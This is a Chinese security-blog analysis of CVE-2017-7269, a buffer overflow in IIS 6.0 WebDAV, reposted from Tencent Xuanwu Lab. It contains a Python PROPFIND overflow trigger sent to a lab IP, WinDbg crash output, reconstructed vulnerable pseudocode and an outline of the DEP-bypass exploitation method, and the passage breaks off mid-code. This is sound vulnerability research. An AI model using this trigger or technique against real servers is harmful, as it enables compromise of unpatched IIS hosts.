<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>深入分析NSA用了5年的IIS漏洞</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">深入分析NSA用了5年的IIS漏洞</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-04-18" class="timeago">5 月 之前</time>
          <time datetime="2017-04-18" class="fulldate">四月 18, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss" value="Ke Liu" name="">
来源：<a href="http://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/">玄武实验室</a><br />
作者: <strong>Ke Liu of Tencent’s Xuanwu Lab</strong></p>
<h2>1. 漏洞简介</h2>
<h3>1.1 漏洞简介</h3>
<p>2017年3月27日，来自华南理工大学的 Zhiniang Peng 和 Chen Wu 在 GitHub [<a href="https://github.com/edwardz246003/IIS_exploit">1</a>] 上公开了一份 IIS 6.0 的漏洞利用代码，并指明其可能于 2016 年 7 月份或 8 月份被用于黑客攻击活动。</p>
<p>该漏洞的编号为 CVE-2017-7269 [<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269">2</a>]，由恶意的 <code>PROPFIND</code> 请求所引起：当 <code>If</code> 字段包含形如 <code>&lt;http://localhost/xxxx&gt;</code> 的超长URL时，可导致缓冲区溢出（包括栈溢出和堆溢出）。</p>
<p>微软从 2015 年 7 月 14 日开始停止对 Windows Server 2003 的支持，所以这个漏洞也没有官方补丁，0patch [<a href="https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html">3</a>] 提供了一个临时的解决方案。</p>
<p>无独有偶，Shadow Brokers 在2017年4月14日公布了一批新的 NSA 黑客工具，笔者分析后确认其中的 <strong>Explodingcan</strong> 便是 CVE-2017-7269 的漏洞利用程序，而且两个 Exploit 的写法如出一辙，有理由认为两者出自同一团队之手：</p>
<ul>
<li>两个 Exploit 的结构基本一致；</li>
<li>都将 Payload 数据填充到地址 <code>0x680312c0</code>；</li>
<li>都基于 <code>KiFastSystemCall / NtProtectVirtualMemory</code> 绕过 DEP；</li>
</ul>
<p>本文以 3 月份公布的 Exploit 为基础，详细分析该漏洞的基本原理和利用技巧。</p>
<h3>1.2 原理概述</h3>
<ul>
<li><code>CStackBuffer</code> 既可以将栈设置为存储区（少量数据）、也可以将堆设置为存储区（大量数据）；</li>
<li>为 <code>CStackBuffer</code> 分配存储空间时，误将 <strong>字符数</strong> 当做 <strong>字节数</strong> 使用，此为漏洞的根本原因；</li>
<li>因为栈上存在 <code>cookie</code>，不能直接覆盖返回地址；</li>
<li>触发溢出时，改写 <code>CStackBuffer</code> 对象的内存，使之使用地址 <code>0x680312c0</code> 作为存储区；</li>
<li>将 Payload 数据填充到 <code>0x680312c0</code>；</li>
<li>程序存在另一处类似的漏洞，同理溢出后覆盖了栈上的一个指针使之指向 <code>0x680313c0</code>；</li>
<li><code>0x680313c0</code> 将被当做一个对象的起始地址，调用虚函数时将接管控制权；</li>
<li>基于 <code>SharedUserData</code> 调用 <code>KiFastSystemCall</code> 绕过 DEP；</li>
<li>URL 会从 UTF-8 转为 UNICODE 形式；</li>
<li>Shellcode 使用 Alphanumeric 形式编码（UNICODE）；</li>
</ul>
<h1>2. 漏洞原理</h1>
<h3>2.1 环境配置</h3>
<p>在 Windows Server 2003 R2 Standard Edition SP2 上安装 IIS 并为其启用 <strong>WebDAV</strong> 特性即可。
<img alt="为IIS启用WebDAV特性" src="https://images.seebug.org/content/images/2017/04/iis-enable-webdav-1.jpg-w331s" /></p>
<p>修改 Exploit 的目标地址，执行后可以看到 <code>svchost.exe</code> 启动 <code>w3wp.exe</code> 子进程，后者以 <code>NETWORK SERVICE</code> 的身份启动了 <code>calc.exe</code> 进程 。
<img alt="CVE-2017-7269 IIS远程代码执行漏洞exploit" src="https://images.seebug.org/content/images/2017/04/iis-exploit.jpg-w331s" /></p>
<h3>2.2 初步调试</h3>
<p>首先，为进程 <code>w3wp.exe</code> 启用 <strong>PageHeap</strong> 选项；其次，修改 Exploit 的代码，去掉其中的 Shellcode，使之仅发送超长字符串。</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.75.134&#39;</span><span class="p">,</span><span class="mi">80</span><span class="p">))</span>
<span class="n">pay</span><span class="o">=</span><span class="s1">&#39;PROPFIND / HTTP/1.1</span><span class="se">\r\n</span><span class="s1">Host: localhost</span><span class="se">\r\n</span><span class="s1">Content-Length: 0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;If: &lt;http://localhost/aaaaaaa&#39;</span>
<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">10240</span>
<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
</pre></div>


<p>执行之后 IIS 服务器上会启动 <code>w3wp.exe</code> 进程（并不会崩溃），此时将 WinDbg 附加到该进程并再次执行测试代码，即可在调试器中捕获到 <strong>first chance</strong> 异常，可以得到以下信息：</p>
<ul>
<li>在 <code>httpext!ScStoragePathFromUrl+0x360</code> 处复制内存时产生了堆溢出；</li>
<li>溢出的内容和大小看起来是可控的；</li>
<li>被溢出的堆块在 <code>httpext!HrCheckIfHeader+0x0000013c</code> 处分配；</li>
<li>崩溃所在位置也是从函数 <code>httpext!HrCheckIfHeader</code> 执行过来的；</li>
<li>进程带有异常处理，因此不会崩溃；</li>
</ul>
<div class="codehilite"><pre><span></span>$$ 捕获 First Chance 异常
0:020&gt; g
(e74.e80): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00005014 ebx=00002809 ecx=00000a06 edx=0781e7e0 esi=0781a7e4 edi=07821000
eip=67126fdb esp=03fef330 ebp=03fef798 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
httpext!ScStoragePathFromUrl+0x360:
67126fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

0:006&gt; r ecx
ecx=00000a06

0:006&gt; db esi
0781a7e4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a7f4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a804  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a814  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a824  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a834  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a844  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0781a854  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.

$$ 目标堆块分配调用栈
0:006&gt; !heap -p -a edi
    address 07821000 found in
    _DPH_HEAP_ROOT @ 7021000
    in busy allocation (  DPH_HEAP_BLOCK:  UserAddr  UserSize - VirtAddr  VirtSize)
                                 7023680:   781e7d8      2828 -  781e000      4000
    7c83d97a ntdll!RtlAllocateHeap+0x00000e9f
    5b7e1a40 staxmem!MpHeapAlloc+0x000000f3
    5b7e1308 staxmem!ExchMHeapAlloc+0x00000015
    67125df9 httpext!CHeap::Alloc+0x00000017
    67125ee1 httpext!ExAlloc+0x00000008
    67125462 httpext!HrCheckIfHeader+0x0000013c
    6712561e httpext!HrCheckStateHeaders+0x00000010
    6711f659 httpext!CPropFindRequest::Execute+0x000000f0
    6711f7c5 httpext!DAVPropFind+0x00000047
    $$ ......

$$ 调用栈
0:006&gt; k
ChildEBP RetAddr  
03fef798 67119469 httpext!ScStoragePathFromUrl+0x360
03fef7ac 67125484 httpext!CMethUtil::ScStoragePathFromUrl+0x18
03fefc34 6712561e httpext!HrCheckIfHeader+0x15e
03fefc44 6711f659 httpext!HrCheckStateHeaders+0x10
03fefc78 6711f7c5 httpext!CPropFindRequest::Execute+0xf0
03fefc90 671296f2 httpext!DAVPropFind+0x47
$$ ......

$$ 异常可以被处理，因此不会崩溃
0:006&gt; g
(e74.e80): C++ EH exception - code e06d7363 (first chance)
</pre></div>


<h3>2.3 CStackBuffer</h3>
<p>崩溃所在模块 <code>httpext.dll</code> 会多次使用一个名为 <code>CStackBuffer</code> 的模板，笔者写了一份类似的代码，以辅助对漏洞原理的理解。为了简单起见，默认存储类型为 <code>unsigned char</code>，因此省略了模板参数 <code>typename T</code>。</p>
<p><code>CStackBuffer</code> 的相关特性如下：</p>
<ul>
<li>默认使用栈作为存储空间，大小由模板参数 <code>SIZE</code> 决定；</li>
<li>通过 <code>resize</code> 可以将堆设置为存储空间；</li>
<li>通过 <code>fake_heap_size</code> 的最低位标识存储空间的类型；</li>
<li>通过 <code>release</code> 释放存储空间；</li>
<li>对象的内存布局依次为：栈存储空间、堆块大小成员、存储空间指针；</li>
</ul>
<p><code>CStackBuffer</code> 的源码如下：</p>
<div class="codehilite"><pre><span></span><span class="n">template</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">SIZE</span><span class="o">&gt;</span>
<span class="n">class</span> <span class="n">CStackBuffer</span>
<span class="p">{</span>
<span class="nl">public</span><span class="p">:</span>
    <span class="n">CStackBuffer</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fake_heap_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">heap_buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">resize</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">SIZE</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">size</span> <span class="o">=</span> <span class="n">SIZE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">fake_heap_size</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">fake_heap_size</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="n">SIZE</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">release</span><span class="p">();</span>
                <span class="n">heap_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
                <span class="n">fake_heap_size</span> <span class="o">|=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">heap_buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">fake_heap_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">size</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">fake_heap_size</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">fake_heap_size</span> <span class="o">|=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">heap_buffer</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">void</span> <span class="n">release</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fake_heap_size</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">free</span><span class="p">(</span><span class="n">heap_buffer</span><span class="p">);</span>
            <span class="n">heap_buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">get</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="n">heap_buffer</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">getFakeSize</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="n">fake_heap_size</span><span class="p">;</span>
    <span class="p">}</span>

<span class="nl">private</span><span class="p">:</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fake_heap_size</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">heap_buffer</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>


<h3>2.4 漏洞调试</h3>
<p>根据之前的简单分析，可知 <code>HrCheckIfHeader</code> 是一个关键函数，因为：</p>
<ul>
<li>目标堆块是在这个函数中动态分配的；</li>
<li>从这里可以执行到触发异常的函数 <code>ScStoragePathFromUrl</code>；</li>
</ul>
<p>函数 <code>HrCheckIfHeader</code> 简化后的伪代码如下所示：</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">HrCheckIfHeader</span><span class="p">(</span><span class="n">CMethUtil</span> <span class="o">*</span><span class="n">pMethUtil</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="mi">260</span><span class="o">&gt;</span> <span class="n">buffer1</span><span class="p">;</span>
    <span class="n">LPWSTR</span> <span class="n">lpIfHeader</span> <span class="o">=</span> <span class="n">CRequest</span><span class="o">::</span><span class="n">LpwszGetHeader</span><span class="p">(</span><span class="s">&quot;If&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">IFILTER</span> <span class="n">ifilter</span><span class="p">(</span><span class="n">lpIfHeader</span><span class="p">);</span>
    <span class="n">LPWSTR</span> <span class="n">lpToken</span> <span class="o">=</span> <span class="n">ifilter</span><span class="o">-&gt;</span><span class="n">PszNextToken</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// &lt;http://xxxxx&gt;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpToken</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="mi">260</span><span class="o">&gt;</span> <span class="n">buffer2</span><span class="p">;</span>
            <span class="c1">// http://xxxx&gt;</span>
            <span class="n">LPWSTR</span> <span class="n">lpHttpUrl</span> <span class="o">=</span> <span class="n">lpToken</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
            <span class="kt">size_t</span> <span class="n">length</span> <span class="o">=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">lpHttpUrl</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buffer2</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">length</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">buffer2</span><span class="p">.</span><span class="n">release</span><span class="p">();</span>
                <span class="k">return</span> <span class="mh">0x8007000E</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="c1">// 将 URL 规范化后存入 buffer2</span>
            <span class="c1">// length = wcslen(lpHttpUrl) + 1</span>
            <span class="c1">// eax = 0</span>
            <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">ScCanonicalizePrefixedURL</span><span class="p">(</span>
                <span class="n">lpHttpUrl</span><span class="p">,</span> <span class="n">buffer2</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">length</span> <span class="o">=</span> <span class="n">buffer1</span><span class="p">.</span><span class="n">getFakeSize</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">;</span>
                <span class="n">res</span> <span class="o">=</span> <span class="n">pMethUtil</span><span class="o">-&gt;</span><span class="n">ScStoragePathFromUrl</span><span class="p">(</span>
                    <span class="n">buffer2</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">buffer1</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">buffer1</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
                    <span class="p">{</span>
                        <span class="n">res</span> <span class="o">=</span> <span class="n">pMethUtil</span><span class="o">-&gt;</span><span class="n">ScStoragePathFromUrl</span><span class="p">(</span>
                            <span class="n">buffer2</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">buffer1</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="c1">// ......</span>
    <span class="p">}</span>
    <span class="c1">// ......</span>
<span class="p">}</span>
</pre></div>


<p>可以看出这里的关键函数为 <code>CMethUtil::ScStoragePathFromUrl</code>，该函数会将请求转发给 <code>ScStoragePathFromUrl</code>，后者简化后的伪代码如下所示：</p>
<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_HSE_UNICODE_URL_MAPEX_INFO</span> <span class="p">{</span>
    <span class="n">WCHAR</span> <span class="n">lpszPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
    <span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">;</span>        <span class="c1">// The physical path that the virtual root maps to</span>
    <span class="n">DWORD</span> <span class="n">cchMatchingPath</span><span class="p">;</span><span class="c1">// Number of characters in the physical path</span>
    <span class="n">DWORD</span> <span class="n">cchMatchingURL</span><span class="p">;</span> <span class="c1">// Number of characters in the URL</span>
    <span class="n">DWORD</span> <span class="n">dwReserved1</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwReserved2</span><span class="p">;</span>
<span class="p">}</span> <span class="n">HSE_UNICODE_URL_MAPEX_INFO</span><span class="p">,</span> <span class="o">*</span> <span class="n">LPHSE_UNICODE_URL_MAPEX_INFO</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">ScStoragePathFromUrl</span><span class="p">(</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">IEcb</span> <span class="o">*</span><span class="n">iecb</span><span class="p">,</span> 
    <span class="k">const</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">buffer2</span><span class="p">,</span> 
    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">buffer1</span><span class="p">,</span> 
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">length</span><span class="p">,</span> 
    <span class="k">struct</span> <span class="n">CVRoot</span> <span class="o">**</span><span class="n">a5</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">Str</span> <span class="o">=</span> <span class="n">buffer2</span><span class="p">;</span>
    <span class="c1">// 检查是否为 https://locahost:80/path http://localhost/path</span>
    <span class="c1">// 返回 /path&gt;</span>
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">iecb</span><span class="o">-&gt;</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Str</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">*</span><span class="n">Str</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="mh">0x80150101</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">v7</span> <span class="o">=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>

    <span class="c1">// c:\inetpub\wwwroot\path</span>
    <span class="c1">// dwFlags          = 0x0201</span>
    <span class="c1">// cchMatchingPath  = 0x12</span>
    <span class="c1">// cchMatchingURL   = 0x00</span>
    <span class="c1">// result = 0</span>
    <span class="n">HSE_UNICODE_URL_MAPEX_INFO</span> <span class="n">mapinfo</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">iecb</span><span class="o">-&gt;</span><span class="n">ScReqMapUrlToPathEx</span><span class="p">(</span><span class="n">Str</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mapinfo</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">v36</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">result</span><span class="p">;</span>

    <span class="c1">// L&quot;\x00c:\inetpub\wwwroot&quot;</span>
    <span class="c1">// n == 0</span>
    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">Str1</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">iecb</span><span class="o">-&gt;</span><span class="n">CchGetVirtualRootW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Str1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">==</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">n</span> <span class="o">||</span> <span class="n">Str</span><span class="p">[</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">_wcsnicmp</span><span class="p">(</span><span class="n">Str1</span><span class="p">,</span> <span class="n">Str</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">goto</span> <span class="n">LABEL_14</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">Str</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span> <span class="o">||</span> <span class="n">Str</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="o">--</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span><span class="p">;</span>
            <span class="k">goto</span> <span class="n">LABEL_14</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">v36</span> <span class="o">=</span> <span class="mh">0x1507F7</span><span class="p">;</span>
<span class="nl">LABEL_14</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">v36</span> <span class="o">==</span> <span class="mh">0x1507F7</span> <span class="o">&amp;&amp;</span> <span class="n">a5</span><span class="p">)</span>      <span class="c1">// a5 == 0</span>
    <span class="p">{</span>
        <span class="c1">// ......</span>
    <span class="p">}</span>

    <span class="c1">// 0x12</span>
    <span class="kt">int</span> <span class="n">v16</span> <span class="o">=</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// v17 = L&quot;t\aaaaaaaAAA....&quot;</span>
